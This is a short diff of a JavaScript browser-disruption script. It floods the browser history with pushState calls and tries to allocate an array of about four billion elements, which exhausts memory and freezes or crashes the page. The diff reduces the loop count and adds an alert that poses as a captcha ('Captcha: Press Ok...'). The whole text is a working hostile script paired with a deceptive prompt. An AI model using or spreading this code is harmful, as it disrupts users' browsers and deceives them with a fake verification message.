@@ -2,7 +2,7 @@
 Click to enter JavaScript
 */
 done = false;
-num = 54000
+num = 1500
 x = window.location.href;
 for (var i = 1; i <= num; i++) {
     history.pushState(0, 0, i == num ? x : i.toString());
@@ -10,6 +10,7 @@ for (var i = 1; i <= num; i++) {
         done = true
     }
 }
+alert("Captcha: Press Ok...")
 javascript:[...Array(2**32-1)].map(_=>Math.ceil(Math.random()*111))
 var CTE = {};
 
